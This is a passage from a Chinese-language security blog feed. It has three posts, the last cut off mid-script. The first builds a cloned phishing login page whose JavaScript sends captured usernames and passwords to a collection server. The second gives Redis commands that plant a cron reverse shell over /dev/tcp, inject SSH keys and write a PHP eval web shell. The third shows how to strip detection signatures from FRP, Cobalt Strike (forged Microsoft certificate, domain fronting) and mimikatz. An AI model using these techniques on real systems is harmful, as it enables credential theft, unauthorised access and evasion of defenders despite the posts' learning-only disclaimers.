data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/40.png" alt="image-20210818111703403"></p><h2 id="编写钓鱼页面"><a href="#编写钓鱼页面" class="headerlink" title="编写钓鱼页面"></a>编写钓鱼页面</h2><p>一般把目标网站copy到本地，然后把页面中的<code>/test/login.html</code>进行补全<code>http://127.0.0.1/test/login.html</code>，具体看网页去，然后修改action标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;javascript:login()&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>一般是这样的，我们只需要把函数进行修改或者自定义，替换成下面函数</p><p><strong>不同的网页不同的改法，我这边只是做个样例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> login2 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line"><span class="keyword">var</span> region = $(<span class="string">&quot;#region&quot;</span>).<span class="title function_">val</span>()</span><br><span class="line"><span class="keyword">if</span> (username.<span class="property">length</span> == <span class="number">0</span> || password.<span class="property">length</span> == <span class="number">0</span> || region.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//alert(&#x27;你东西没填是吧&#x27;)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;空&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username.<span class="property">length</span> == <span class="number">0</span>)</span><br><span class="line">$.<span class="title function_">get</span>(<span class="string">&#x27;http://127.0.0.1:9999/b/sasdasdasd/?&#x27;</span>, &#123;</span><br><span class="line"><span class="attr">username</span>: username,</span><br><span class="line"><span class="attr">password</span>: password,</span><br><span class="line"><span class="attr">region</span>: region</span><br><span class="line">&#125;, <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://ascotbe.com&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);&#125;</span><br></pre></td></tr></table></figure><blockquote><p>整站拉取</p></blockquote><p>可以使用kali或者Ubuntu进行下载，然后进行网站克隆，一般不太会用到，做个记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install httrack</span><br></pre></td></tr></table></figure><h2 id="钓鱼网站搭建"><a href="#钓鱼网站搭建" class="headerlink" title="钓鱼网站搭建"></a>钓鱼网站搭建</h2><blockquote><p>安装nginx</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>查看安装版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure><p>启动nginx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure><p>然后输入服务器IP就能看到下面效果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/41.png" alt="image-20210817160653634"></p><blockquote><p>配置钓鱼页面</p></blockquote><p>进入nginx默认的网页目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure><p>你会看到index.html、index.htm、index.nginx-debian.html三个文件中的任意一个（建议全部删了）然后把你改好的钓鱼页面放到上面</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/42.png" alt="image-20210817161251555">修改nginx的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/43.png" alt="image-20210817160440321"></p><p>接着重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure><p>可以看到已经成功的页面</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/44.png" alt="image-20210821113122300"></p><p>配置SSL证书，还是对<code>/etc/nginx/sites-enabled/default</code>文件进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 服务器端口使用443，开启ssl, 这里ssl就是上面安装的ssl模块</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    #填写绑定证书的域名</span><br><span class="line">    server_name  ascotbe.com;</span><br><span class="line">    </span><br><span class="line">    # ssl证书地址</span><br><span class="line">    ssl_certificate     /etc/nginx/cert/ssl.crt;  #证书文件名称</span><br><span class="line">    ssl_certificate_key  /etc/nginx/cert/ssl.key; # 私钥文件名称</span><br><span class="line">    </span><br><span class="line">    # ssl验证相关配置</span><br><span class="line">    ssl_session_timeout  5m;    #缓存有效期</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;    #加密算法</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;    #安全链接可选的加密协议</span><br><span class="line">    ssl_prefer_server_ciphers on;   #使用服务器端的首选算法</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">    #网站主页路径。此路径仅供参考，具体请您按照实际目录操作</span><br><span class="line">        root   /var/www/html;</span><br><span class="line">        index  logon.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  ascotbe.com;</span><br><span class="line">    return 301 https://$server_name$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最好重启Nginx即可看到结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/Offer/45.png" alt="image-20210817184011177"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Redis写SHELL</title>
    <link href="https://www.ascotbe.com/2021/07/12/RedisWritesShell/"/>
    <id>https://www.ascotbe.com/2021/07/12/RedisWritesShell/</id>
    <published>2021-07-12T15:07:46.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><h2 id="通过计划任务获取SHELL"><a href="#通过计划任务获取SHELL" class="headerlink" title="通过计划任务获取SHELL"></a>通过计划任务获取SHELL</h2><p>首先进行连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.251.17 -p 6379</span><br></pre></td></tr></table></figure><p>然后设置文件夹路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure><p>如果出现<code>(error) ERR Changing directory: Permission denied</code>标明Redis并不是root权限启动的，权限不足，需要使用<code>redis-server /etc/redis/redis.conf</code>来启动程序，不能使用<code>service redis start</code>来启动</p><p>接着修改文件，Ubuntu的计划任务是在这个文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure><p>设置计划任务，需要添加<code>\n</code>符号，因为写进去后会有很多无用数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.251.16/8899 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure><p>保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="通过SSH-key获取SHELL"><a href="#通过SSH-key获取SHELL" class="headerlink" title="通过SSH key获取SHELL"></a>通过SSH key获取SHELL</h2><p>首先生成公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后把key写入文本中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat test.pub; echo -e &quot;\n\n\n\n&quot;) &gt; test.txt</span><br></pre></td></tr></table></figure><p>接着使用命令启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat test.txt | redis-cli -h 192.168.251.18 -p 6379 -x set crack</span><br><span class="line">redis-cli -h 192.168.251.18 -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="通过Web目录写SHELL"><a href="#通过Web目录写SHELL" class="headerlink" title="通过Web目录写SHELL"></a>通过Web目录写SHELL</h2><p>需要条件</p><ul><li>知道web目录</li><li>当前用户在该目录下具有写权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/ascotbe.com/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常见工具特征去除</title>
    <link href="https://www.ascotbe.com/2021/07/09/FrequentToolCharacteristics/"/>
    <id>https://www.ascotbe.com/2021/07/09/FrequentToolCharacteristics/</id>
    <published>2021-07-09T15:07:46.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/1.png" alt="image-20210709162951851" style="zoom:50%;" /><h2 id="FRP改造"><a href="#FRP改造" class="headerlink" title="FRP改造"></a>FRP改造</h2><blockquote><h3 id="改造之前"><a href="#改造之前" class="headerlink" title="改造之前"></a>改造之前</h3></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/2.png" alt="image-20210707150953360"></p><p>在受害者机器上使用<code>frpc.exe -c frpc_socker.ini</code>连接服务起的时候，会产生一个这种数据校检</p><blockquote><h3 id="流量改造"><a href="#流量改造" class="headerlink" title="流量改造"></a>流量改造</h3></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg\msg\msg.go</span><br></pre></td></tr></table></figure><p>这几个函数中保存着上面的信息</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/3.png" alt="image-20210707151346655"></p><p>我在前加个了前缀</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/4.png" alt="image-20210708142818186"></p><p>而在<code>pkg\util\version\version.go</code> 中定义了版本信息，这里也可以修改一下</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/5.png" alt="image-20210707153734705"></p><p>改成随便一个版本</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/6.png" alt="image-20210708142835960"></p><p>结果如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/7.png" alt="image-20210708145449323"></p><blockquote><h3 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h3></blockquote><p>首先执行<code>make</code>会进行一些GitHub的包下载（最好使用代理</p><p>接着执行<code>make -f Makefile.cross-compiles</code>进行编译</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/8.png" alt="image-20210708143346779"></p><blockquote><h3 id="配置文件改造"><a href="#配置文件改造" class="headerlink" title="配置文件改造"></a>配置文件改造</h3></blockquote><p>全称只需要修改这个文件<code>cmd/frpc/sub/root.go</code></p><p>先修改var位置，添加ip、port、fileContent这三个参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">cfgFile     <span class="type">string</span></span><br><span class="line">showVersion <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">serverAddr        <span class="type">string</span></span><br><span class="line">user              <span class="type">string</span></span><br><span class="line">protocol          <span class="type">string</span></span><br><span class="line">token             <span class="type">string</span></span><br><span class="line">logLevel          <span class="type">string</span></span><br><span class="line">logFile           <span class="type">string</span></span><br><span class="line">logMaxDays        <span class="type">int</span></span><br><span class="line">disableLogColor   <span class="type">bool</span></span><br><span class="line">ip                <span class="type">string</span></span><br><span class="line">port              <span class="type">string</span></span><br><span class="line">fileContent       <span class="type">string</span></span><br><span class="line">proxyName         <span class="type">string</span></span><br><span class="line">localIp           <span class="type">string</span></span><br><span class="line">localPort         <span class="type">int</span></span><br><span class="line">remotePort        <span class="type">int</span></span><br><span class="line">useEncryption     <span class="type">bool</span></span><br><span class="line">useCompression    <span class="type">bool</span></span><br><span class="line">customDomains     <span class="type">string</span></span><br><span class="line">subDomain         <span class="type">string</span></span><br><span class="line">httpUser          <span class="type">string</span></span><br><span class="line">httpPwd           <span class="type">string</span></span><br><span class="line">locations         <span class="type">string</span></span><br><span class="line">hostHeaderRewrite <span class="type">string</span></span><br><span class="line">role              <span class="type">string</span></span><br><span class="line">sk                <span class="type">string</span></span><br><span class="line">multiplexer       <span class="type">string</span></span><br><span class="line">serverName        <span class="type">string</span></span><br><span class="line">bindAddr          <span class="type">string</span></span><br><span class="line">bindPort          <span class="type">int</span></span><br><span class="line"></span><br><span class="line">kcpDoneCh <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>再修改传参位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;./frpc.ini&quot;</span>, <span class="string">&quot;config file of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, <span class="string">&quot;version&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;version of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="string">&quot;server_addr&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_addr&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="string">&quot;server_port&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_port&quot;</span>)</span><br><span class="line">kcpDoneCh = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后自定义一个函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ip <span class="type">string</span>, port <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">    tls_enable = true</span></span><br><span class="line"><span class="string">token = china_nb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[plugin_socks5]</span></span><br><span class="line"><span class="string">type = tcp</span></span><br><span class="line"><span class="string">remote_port = 12345</span></span><br><span class="line"><span class="string">plugin = socks5</span></span><br><span class="line"><span class="string">plugin_user = admin</span></span><br><span class="line"><span class="string">plugin_passwd = admin</span></span><br><span class="line"><span class="string">use_encryption = true </span></span><br><span class="line"><span class="string">use_compression = true</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">fileContent = content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>runClient</code>函数    </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runClient</span><span class="params">(cfgFilePath <span class="type">string</span>,ip <span class="type">string</span>,port <span class="type">string</span>)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="type">string</span></span><br><span class="line">getFileContent(ip,port)</span><br><span class="line"><span class="comment">//scontent, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line">content, err = fileContent, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后runClient()函数下调用我们自定义的函数getFileContent()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rootCmd = &amp;cobra.Command&#123;</span><br><span class="line">Use:   <span class="string">&quot;frpc&quot;</span>,</span><br><span class="line">Short: <span class="string">&quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;</span>,</span><br><span class="line">RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> showVersion &#123;</span><br><span class="line">fmt.Println(version.Full())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Do not show command usage here.</span></span><br><span class="line">err := runClient(cfgFile,ip,port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/9.png" alt="image-20210708165905688"></p><h2 id="CobaltStrike改造"><a href="#CobaltStrike改造" class="headerlink" title="CobaltStrike改造"></a>CobaltStrike改造</h2><blockquote><h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3></blockquote><p>编辑teamserver文件，更改<code>Dcobaltstrike.server_port</code>参数为8090</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/10.png" alt="image-20210709100449609"></p><blockquote><h3 id="修改证书特征"><a href="#修改证书特征" class="headerlink" title="修改证书特征"></a>修改证书特征</h3></blockquote><p>查看证书，密码默认的123456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/11.png" alt="image-20210709100749504"></p><p>从图中可以看到别名、所有者、发布者都有明显的cobaltstrike特征，所以我们可以把原证书给删了，使用以下命令生成一个新的证书</p><ul><li><code>-alias</code>          指定别名</li><li><code>-storepass</code>      指定更改密钥库的存储口令</li><li><code>‐keypass pass</code>   指定更改条目的密钥口令</li><li><code>-keyalg</code>         指定算法</li><li><code>-dname</code>          指定所有者信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias Microsoft.com -dname &quot;CN=Microsoft e-Szigno Root CA, OU=e-Szigno CA, O=Microsoft Ltd., L=Budapest, S=HU, C=HU&quot; </span><br></pre></td></tr></table></figure><blockquote><h3 id="流量伪装"><a href="#流量伪装" class="headerlink" title="流量伪装"></a>流量伪装</h3></blockquote><p>通过使用项目来操作<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a></p><p>使用方法：<code>./teamserver [external IP] [password] [/path/to/my.profile]</code></p><p>如果我们自己编写插件的话，可以使用<code>.\c2lint [/path/to/my.profile]</code>来验证是否可以使用</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/12.png" alt="image-20210709133929402"></p><p>可以看到我们使用了插件后流量数据修改了，但是还有一个不足的点这边会显示我们的IP地址</p><blockquote><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3></blockquote><p>在上述我们修改了流量特征后发现还是会泄露我们的IP，会给防守队的溯源提供便利，所以我们可以使用CDN进行操作。由于现在的CDN需要验证域名所属了，没办法用像<code>ccc.github.com</code>、<code>ccc.apple.com</code>这种的域名了，所以本文中使用<code>a.test.com</code>作为域名讲解</p><p>首先修改我们使用的Malleable-C2-Profiles，把下图的参数都修改为<code>a.test.com</code>这个域名</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/13.png" alt="image-20210709142040450"></p><p>然后重启Cobaltstrike，在监听器中按下图进行设置</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/FrequentToolCharacteristics/14.png" alt="image-20210709150735281"></p><p>然后再用该监听器生成的木马即可实现域前置</p><h2 id="mimikatz改造"><a href="#mimikatz改造" class="headerlink" title="mimikatz改造"></a>mimikatz改造</h2><p>替换关键字脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 